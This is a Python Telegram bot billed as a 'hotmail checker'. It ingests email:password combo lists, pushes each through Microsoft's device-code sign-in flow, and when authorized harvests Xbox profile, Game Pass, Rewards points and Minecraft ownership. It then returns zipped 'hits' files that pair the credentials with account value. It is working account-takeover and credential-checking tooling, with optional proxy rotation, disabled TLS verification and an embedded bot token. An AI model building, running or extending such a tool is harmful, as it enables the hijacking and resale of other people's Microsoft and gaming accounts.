import asyncio
import aiohttp
import base64
import json
import logging
import os
import random
import re
import time
import zipfile
import shutil
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
ADMIN_IDS = [7595790309]
USE_PROXIES = False

MAX_CONCURRENT = 5 # Lowered concurrency for device code flow
TIMEOUT = 30
TEMP_DIR = "./temp"

# Microsoft / Xbox endpoints
# We now use the /consumers endpoint for personal accounts
MS_DEVICECODE_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/devicecode"
MS_TOKEN_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
XBL_AUTH_URL = "https://user.auth.xboxlive.com/user/authenticate"
XSTS_URL = "https://xsts.auth.xboxlive.com/xsts/authorize"
PROFILE_URL = "https://profile.xboxlive.com/users/xuid({xuid})/profile/settings"
TITLES_URL = "https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
MC_LOGIN_URL = "https://api.minecraftservices.com/authentication/login_with_xbox"
MC_PROFILE_URL = "https://api.minecraftservices.com/minecraft/profile"
GAMEPASS_URL = "https://collections.mp.microsoft.com/v9.0/collections/publisherQuery"
REWARDS_URL = "https://prod.rewardsplatform.microsoft.com/dapi/me?channel=SAAndroid&options=511"

# The Minecraft client ID works with the device code flow
CLIENT_ID = "00000000402B5328"
SCOPE = "XboxLive.signin offline_access"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("nyx")
os.makedirs(TEMP_DIR, exist_ok=True)

# ============================================================
# PROXY FETCHER (kept for completeness)
# ============================================================
async def fetch_proxies() -> list:
    if not USE_PROXIES: return []
    url = "https://freeproxiesbyvortex.lovable.app/proxies"
    proxies = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as resp:
                html = await resp.text()
        pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b'
        matches = re.findall(pattern, html)
        seen = set()
        for m in matches:
            if m not in seen:
                seen.add(m)
                proxies.append(f"http://{m}")
    except Exception as e:
        log.error(f"Proxy fetch failed: {e}")
    return proxies

PROXIES = []
def pick_proxy():
    if PROXIES and USE_PROXIES:
        return random.choice(PROXIES)
    return None

# ============================================================
# HELPERS & AUTH CHAIN
# ============================================================
def decode_jwt_payload(token: str):
    try:
        parts = token.split(".")
        if len(parts) < 2: return {}
        payload = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception: return {}

TLD_COUNTRY = {
    "co.uk": "GB", "uk": "GB", "fr": "FR", "de": "DE", "it": "IT", "es": "ES",
    "mx": "MX", "jp": "JP", "br": "BR", "pt": "PT", "co.za": "ZA",
    "com.au": "AU", "au": "AU", "co.th": "TH", "th": "TH", "co.kr": "KR",
    "kr": "KR", "sg": "SG", "eg": "EG", "hu": "HU", "ru": "RU", "se": "SE",
    "dk": "DK", "nl": "NL", "be": "BE", "fi": "FI", "ch": "CH", "at": "AT",
    "ie": "IE", "ca": "CA", "cl": "CL", "ar": "AR", "co": "CO", "pe": "PE",
    "ve": "VE", "in": "IN", "cn": "CN", "tw": "TW", "hk": "HK", "il": "IL",
    "sa": "SA", "ae": "AE", "tr": "TR", "pl": "PL", "cz": "CZ", "gr": "GR",
}

def detect_country(email: str, jwt_country: str = "") -> str:
    if jwt_country: return jwt_country.upper()
    dom = email.split("@")[-1].lower()
    for suffix, code in sorted(TLD_COUNTRY.items(), key=lambda x: -len(x[0])):
        if dom.endswith("." + suffix): return code
    return "US"

async def ms_device_code_flow(session, email, status_msg):
    # Step 1: Request device code
    payload = {"client_id": CLIENT_ID, "scope": SCOPE}
    try:
        async with session.post(MS_DEVICECODE_URL, data=payload, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status != 200:
                return {"ok": False, "kind": "BAD", "detail": "Device code request failed"}
            dc_data = await r.json()
            device_code = dc_data["device_code"]
            user_code = dc_data["user_code"]
            verification_uri = dc_data["verification_uri"]
            interval = dc_data.get("interval", 5)
            expires_in = dc_data.get("expires_in", 900)
    except Exception as e:
        return {"ok": False, "kind": "ERR", "detail": str(e)}

    # Step 2: Prompt the user in Telegram
    prompt_text = (
        f"🔑 **Action Required for {email}**\n\n"
        f"1. Go to: {verification_uri}\n"
        f"2. Enter code: `{user_code}`\n\n"
        f"Waiting for authorization..."
    )
    await status_msg.edit_text(prompt_text, parse_mode=ParseMode.HTML)

    # Step 3: Poll for token
    token_payload = {
        "client_id": CLIENT_ID,
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": device_code
    }
    start_time = time.time()
    while time.time() - start_time < expires_in:
        try:
            async with session.post(MS_TOKEN_URL, data=token_payload, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                body = await r.text()
                if r.status == 200:
                    return {"ok": True, "data": await r.json()}
                
                err_data = json.loads(body)
                if err_data.get("error") == "authorization_pending":
                    await asyncio.sleep(interval)
                    continue
                elif err_data.get("error") == "slow_down":
                    interval += 5
                    await asyncio.sleep(interval)
                    continue
                else:
                    return {"ok": False, "kind": "BAD", "detail": err_data.get("error_description", "Device flow failed")}
        except Exception:
            await asyncio.sleep(interval)
    
    return {"ok": False, "kind": "ERR", "detail": "Device flow expired"}

async def xbox_user_auth(session, ms_access):
    payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": f"d={ms_access}"}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
    headers = {"Content-Type": "application/json", "Accept": "application/json", "x-xbl-contract-version": "1"}
    try:
        async with session.post(XBL_AUTH_URL, json=payload, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200: return (await r.json()).get("Token")
    except Exception: pass
    return None

async def xsts_auth(session, xbl_token, relying_party):
    payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]}, "RelyingParty": relying_party, "TokenType": "JWT"}
    headers = {"Content-Type": "application/json", "Accept": "application/json", "x-xbl-contract-version": "1"}
    try:
        async with session.post(XSTS_URL, json=payload, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json()
                xui = data.get("DisplayClaims", {}).get("xui", [])
                if xui: return {"token": data.get("Token"), "uhs": xui[0].get("uhs", ""), "xuid": xui[0].get("xid", "")}
    except Exception: pass
    return None

async def xbox_profile(session, xsts_token, uhs, xuid):
    url = PROFILE_URL.format(xuid=xuid) + "?settings=Gamertag,Gamerscore,GameDisplayPicRaw,Location,Bio"
    headers = {"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2", "Accept": "application/json"}
    try:
        async with session.get(url, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json()
                settings = {s["id"]: s["value"] for s in data.get("profileUsers", [{}])[0].get("settings", [])}
                return {
                    "gamertag": settings.get("Gamertag", ""),
                    "gamerscore": settings.get("Gamerscore", "0"),
                    "location": settings.get("Location", ""),
                    "bio": settings.get("Bio", "")
                }
    except Exception: pass
    return {}

async def check_gamepass(session, xsts_token, uhs):
    payload = {"market": "US", "language": "en-US", "productSkuIds": ["9N0L65V3Z5T3"], "expandSatisfyingItems": True}
    headers = {"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "Content-Type": "application/json", "Accept": "application/json"}
    try:
        async with session.post(GAMEPASS_URL, json=payload, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json()
                items = data.get("satisfyingItems", [])
                for item in items:
                    if item.get("isActive"): return True
            return False
    except Exception: return False

async def check_rewards(session, ms_access):
    headers = {"Authorization": f"Bearer {ms_access}", "Accept": "application/json"}
    try:
        async with session.get(REWARDS_URL, headers=headers, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json()
                return data.get("response", {}).get("balance", 0)
    except Exception: pass
    return 0

async def check_minecraft(session, xbl_token):
    xsts = await xsts_auth(session, xbl_token, "rp://api.minecraftservices.com/")
    if not xsts: return None
    try:
        async with session.post(MC_LOGIN_URL, json={"identityToken": f"XBL3.0 x={xsts['uhs']};{xsts['token']}"}, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status != 200: return None
            mc_token = (await r.json()).get("access_token")
        if not mc_token: return None
        async with session.get(MC_PROFILE_URL, headers={"Authorization": f"Bearer {mc_token}"}, proxy=pick_proxy(), timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200: return (await r.json()).get("name") or "has_mc"
    except Exception: pass
    return None

async def check_account(session, email, password, status_msg):
    result = {"email": email, "password": password, "status": "BAD", "detail": "unknown"}
    
    # 1. Use Device Code Flow instead of ROPC
    auth_result = await ms_device_code_flow(session, email, status_msg)
    if not auth_result["ok"]:
        result["status"] = auth_result["kind"]
        result["detail"] = auth_result.get("detail", "")
        return result
        
    result["status"] = "HIT"
    ms_access = auth_result["data"].get("access_token", "")
    jwt = decode_jwt_payload(ms_access)
    result["country"] = detect_country(email, jwt.get("ctry", "") or jwt.get("country", ""))
    
    # 2. Proceed with Xbox Live and other checks
    xbl_token = await xbox_user_auth(session, ms_access)
    result.update({"gamertag": "", "gamerscore": "0", "location": "", "bio": "", "gamepass": False, "rewards": 0, "minecraft": None})
    
    if xbl_token:
        xsts = await xsts_auth(session, xbl_token, "http://xboxlive.com")
        if xsts:
            profile = await xbox_profile(session, xsts["token"], xsts["uhs"], xsts["xuid"])
            result.update(profile)
            result["gamepass"] = await check_gamepass(session, xsts["token"], xsts["uhs"])
            
        result["rewards"] = await check_rewards(session, ms_access)
        result["minecraft"] = await check_minecraft(session, xbl_token)
        
    return result

# ============================================================
# PROCESSING & TELEGRAM
# ============================================================
async def process_combos(combos, chat_id, status_msg, bot):
    results = []
    total = len(combos)
    t_start = time.time()
    
    # Process sequentially because of manual user interaction
    for i, (email, password) in enumerate(combos):
        current_status = await status_msg.edit_text(
            f"<b>Processing {i+1}/{total}...</b>\n"
            f"Account: <code>{email}</code>\n"
            f"Please wait...",
            parse_mode=ParseMode.HTML
        )
        
        result = await check_account(session, email, password, current_status)
        results.append(result)
        
        # Small delay to avoid spamming Telegram
        await asyncio.sleep(1)

    elapsed = time.time() - t_start
    hits = [r for r in results if r["status"] == "HIT"]
    bad = [r for r in results if r["status"] == "BAD"]
    errors = [r for r in results if r["status"] in ("ERR", "RATE", "2FA")]
    
    ts = int(time.time()); workdir = os.path.join(TEMP_DIR, f"run_{ts}"); os.makedirs(workdir, exist_ok=True)

    def write_file(name, lines):
        with open(os.path.join(workdir, name), "w") as f: f.write("\n".join(lines))

    write_file("hits.txt", [f"{r['email']}:{r['password']}" for r in hits])
    write_file("bad.txt", [f"{r['email']}:{r['password']} | {r.get('detail', '')}" for r in bad])
    write_file("errors.txt", [f"{r['email']}:{r['password']} | {r.get('detail', '')}" for r in errors])
    
    write_file("xbox_profile.txt", [f"{r['email']}:{r['password']} | {r['gamertag']} | {r['gamerscore']} GS" for r in hits if r.get('gamertag')])
    write_file("gamepass.txt", [f"{r['email']}:{r['password']} | Active: {r['gamepass']}" for r in hits if r.get('gamepass')])
    write_file("minecraft.txt", [f"{r['email']}:{r['password']} | {r['minecraft']}" for r in hits if r.get('minecraft')])
    write_file("rewards.txt", [f"{r['email']}:{r['password']} | Points: {r['rewards']}" for r in hits if r.get('rewards', 0) > 0])
    
    placeholders = ["instagram.txt", "psn.txt", "steam.txt", "supercell.txt", "tiktok.txt", "balance.txt"]
    for ph in placeholders:
        with open(os.path.join(workdir, ph), "w") as f:
            f.write("# This service requires a separate module.\n")

    write_file("summary.txt", [f"Module: hotmail", f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Hits: {len(hits)}", f"Bad: {len(bad)}", f"Errors: {len(errors)}", f"Elapsed: {elapsed:.1f}s"])

    zip_path = os.path.join(TEMP_DIR, f"results_{ts}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for fname in os.listdir(workdir): zf.write(os.path.join(workdir, fname), arcname=fname)

    await status_msg.edit_text(f"<b>✅ done</b>\n\ntotal: <code>{total}</code>\nhits: <b>{len(hits)}</b>\nbad: <b>{len(bad)}</b>\nerrors: <b>{len(errors)}</b>\ntime: <code>{elapsed:.1f}s</code>", parse_mode=ParseMode.HTML)
    await bot.send_document(chat_id, FSInputFile(zip_path, filename=f"results_{len(hits)}_hits.zip"))
    shutil.rmtree(workdir, ignore_errors=True)
    try: os.remove(zip_path)
    except: pass

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return await msg.answer("not authorized.")
    await msg.answer("<b>hotmail checker</b>\n\nsend a .txt file with <code>email:password</code> combos\none per line.")

@dp.message(F.document)
async def handle_file(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return
    if not msg.document.file_name.lower().endswith(".txt"): return await msg.answer("send a .txt file.")
    status = await msg.answer("downloading...")
    local = os.path.join(TEMP_DIR, f"{msg.document.file_unique_id}.txt")
    try:
        tg = await bot.get_file(msg.document.file_id)
        await bot.download_file(tg.file_path, local)
    except Exception as e: return await status.edit_text(f"download failed: {e}")
    combos = []
    with open(local, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line and not line.startswith("#") and "t.me" not in line:
                e, p = line.split(":", 1)
                if e and p: combos.append((e, p))
    os.remove(local)
    if not combos: return await status.edit_text("no valid combos found.")
    await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting device code flow...")
    
    # Start the process
    global session
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2, ssl=False)
    session = aiohttp.ClientSession(connector=connector)
    try:
        await process_combos(combos, msg.chat.id, status, bot)
    finally:
        await session.close()

# ============================================================
# WEB SERVER FOR RENDER FREE TIER
# ============================================================
async def web_server():
    app = web.Application()
    app.router.add_get("/", lambda r: web.Response(text="Bot is running"))
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"Web server started on port {port}")

async def main():
    asyncio.create_task(web_server())
    
    global PROXIES
    PROXIES = await fetch_proxies()
    log.info(f"starting | proxies={len(PROXIES)}")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
